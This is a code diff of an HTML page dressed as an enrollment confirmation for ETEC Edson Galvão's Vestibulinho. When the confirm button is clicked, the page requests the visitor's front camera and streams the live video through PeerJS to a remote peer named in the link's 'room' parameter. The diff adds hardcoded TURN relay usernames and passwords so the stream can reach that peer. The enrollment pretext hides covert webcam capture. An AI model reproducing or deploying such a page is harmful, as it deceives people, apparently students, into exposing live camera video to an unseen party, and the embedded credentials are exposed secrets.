@@ -5,14 +5,9 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Confirmar inscrição - ETEC Edson Galvão</title>
-
 <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
-
 <style>
-* {
-    box-sizing: border-box;
-}
-
+* { box-sizing: border-box; }
 body {
     margin: 0;
     min-height: 100vh;
@@ -22,7 +17,6 @@ body {
     background: #f3f4f6;
     font-family: Arial, sans-serif;
 }
-
 .container {
     width: 90%;
     max-width: 420px;
@@ -32,7 +26,6 @@ body {
     text-align: center;
     box-shadow: 0 3px 15px #0002;
 }
-
 button {
     width: 100%;
     padding: 20px 10px;
@@ -42,48 +35,48 @@ button {
     border-radius: 8px;
     font-size: 18px;
     font-weight: bold;
-    cursor: pointer;
 }
-
-button:disabled {
-    opacity: .6;
-}
-
-#status {
-    margin-top: 20px;
-    font-size: 15px;
-    line-height: 1.5;
-}
-
+button:disabled { opacity: .6; }
+#status { margin-top: 20px; line-height: 1.5; }
 </style>
 </head>
-
 <body>
-
 <div class="container">
-
-<h2>ETEC Edson Galvão</h2>
-
-<p>Confirme sua inscrição para o Vestibulinho.</p>
-
-<button id="confirmar">
-CONFIRMAR INSCRIÇÃO
-</button>
-
-<div id="status">
-Aguardando sua confirmação.
-</div>
-
+    <h2>ETEC Edson Galvão</h2>
+    <p>Confirme sua inscrição para o Vestibulinho.</p>
+    <button id="confirmar">CONFIRMAR INSCRIÇÃO</button>
+    <div id="status">Aguardando sua confirmação.</div>
 </div>
 
 <script>
-
 const botao = document.getElementById("confirmar");
 const statusEl = document.getElementById("status");
 
-const sala = new URLSearchParams(
-    window.location.search
-).get("room");
+const sala = new URLSearchParams(location.search).get("room");
+
+const iceServers = [
+    { urls: "stun:stun.relay.metered.ca:80" },
+    {
+        urls: "turn:global.relay.metered.ca:80",
+        username: "4882d2f9ee2cf85b5898869a",
+        credential: "4mlHb03re3WB2QSf"
+    },
+    {
+        urls: "turn:global.relay.metered.ca:80?transport=tcp",
+        username: "4882d2f9ee2cf85b5898869a",
+        credential: "4mlHb03re3WB2QSf"
+    },
+    {
+        urls: "turn:global.relay.metered.ca:443",
+        username: "4882d2f9ee2cf85b5898869a",
+        credential: "4mlHb03re3WB2QSf"
+    },
+    {
+        urls: "turns:global.relay.metered.ca:443?transport=tcp",
+        username: "4882d2f9ee2cf85b5898869a",
+        credential: "4mlHb03re3WB2QSf"
+    }
+];
 
 let peer = null;
 let stream = null;
@@ -93,53 +86,18 @@ function mensagem(texto) {
     statusEl.textContent = texto;
 }
 
-function liberarCamera() {
-    if (stream) {
-        stream.getTracks().forEach(track => track.stop());
-        stream = null;
-    }
-}
-
-function liberarConexao() {
-    if (chamada) {
-        chamada.close();
-        chamada = null;
-    }
-
-    if (peer) {
-        peer.destroy();
-        peer = null;
-    }
-}
-
-async function iniciar() {
-
-    botao.disabled = true;
-    botao.textContent = "SOLICITANDO CÂMERA...";
-
-    liberarConexao();
-    liberarCamera();
-
+botao.addEventListener("click", async function() {
     if (!sala) {
         mensagem("Convite inválido. Solicite um novo link.");
-        botao.disabled = false;
-        botao.textContent = "TENTAR NOVAMENTE";
         return;
     }
 
+    botao.disabled = true;
+    botao.textContent = "INICIANDO CÂMERA...";
+
     try {
+        mensagem("Solicitando autorização da câmera...");
 
-        if (!navigator.mediaDevices ||
-            !navigator.mediaDevices.getUserMedia) {
-
-            throw new Error(
-                "Seu navegador não permite acessar a câmera. Abra o convite no Chrome ou Safari atualizado."
-            );
-        }
-
-        mensagem("Solicitando autorização para utilizar a câmera...");
-
-        // Solicita novamente a permissão
         stream = await navigator.mediaDevices.getUserMedia({
             video: {
                 facingMode: "user",
@@ -149,87 +107,57 @@ async function iniciar() {
             audio: false
         });
 
-        mensagem("Câmera autorizada. Preparando conexão...");
+        mensagem("Câmera autorizada. Conectando ao painel...");
 
-        botao.textContent = "CÂMERA AUTORIZADA";
-
-        const faixa = stream.getVideoTracks()[0];
-
-        if (!faixa || faixa.readyState !== "live") {
-            throw new Error("A câmera não está funcionando.");
-        }
-
-        peer = new Peer();
+        peer = new Peer({
+            config: {
+                iceServers: iceServers
+            }
+        });
 
         peer.on("open", function() {
-
-            mensagem("Conectando ao painel de inscrições...");
-
             chamada = peer.call(sala, stream);
 
             if (!chamada) {
-                throw new Error("Não foi possível iniciar a transmissão.");
+                mensagem("Não foi possível iniciar a transmissão.");
+                botao.disabled = false;
+                return;
             }
 
             botao.textContent = "INSCRIÇÃO ENVIADA";
-
-            mensagem(
-                "Câmera autorizada. Solicitação de transmissão enviada ao painel."
-            );
+            mensagem("Câmera ativa. Aguardando confirmação do painel.");
 
             chamada.on("close", function() {
-                mensagem("A conexão foi encerrada.");
+                mensagem("Conexão encerrada.");
             });
 
-            chamada.on("error", function(erro) {
-                console.error(erro);
-                mensagem("Erro durante a transmissão.");
+            chamada.on("error", function() {
+                mensagem("Erro na transmissão. Tente novamente.");
             });
-
         });
 
         peer.on("error", function(erro) {
-
-            console.error("PeerJS:", erro);
-
             mensagem("Erro de conexão: " + erro.type);
-
             botao.disabled = false;
             botao.textContent = "TENTAR NOVAMENTE";
-
         });
 
     } catch (erro) {
-
-        console.error("Erro completo:", erro);
-
-        liberarCamera();
-        liberarConexao();
-
         let texto = erro.message;
 
         if (erro.name === "NotAllowedError") {
-            texto = "Permissão da câmera negada. Autorize a câmera nas configurações do navegador.";
-        }
-
-        if (erro.name === "NotFoundError") {
-            texto = "Nenhuma câmera foi encontrada neste dispositivo.";
-        }
-
-        if (erro.name === "NotReadableError") {
-            texto = "A câmera está sendo utilizada por outro aplicativo.";
+            texto = "Permita o acesso à câmera no navegador.";
+        } else if (erro.name === "NotFoundError") {
+            texto = "Nenhuma câmera encontrada.";
+        } else if (erro.name === "NotReadableError") {
+            texto = "A câmera está sendo usada por outro aplicativo.";
         }
 
         mensagem(texto);
-
         botao.disabled = false;
-        botao.textContent = "SOLICITAR CÂMERA NOVAMENTE";
+        botao.textContent = "TENTAR NOVAMENTE";
     }
-}
-
-botao.addEventListener("click", iniciar);
-
+});
 </script>
-
 </body>
 </html>
